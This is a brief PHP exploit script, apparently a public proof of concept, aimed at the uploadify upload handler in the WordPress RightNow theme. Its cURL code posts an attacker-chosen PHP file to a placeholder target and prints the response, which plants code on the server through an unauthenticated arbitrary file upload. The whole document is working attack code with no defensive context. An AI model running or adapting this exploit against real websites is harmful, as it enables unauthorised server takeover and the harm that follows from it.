<?php
$uploadfile="YourFile.php";
$ch = curl_init("http://[Target]/rightnowwp/wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php");
curl_setopt($ch, CURLOPT_POST, true);  
curl_setopt($ch, CURLOPT_POSTFIELDS,
        array('Filedata'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";
?>
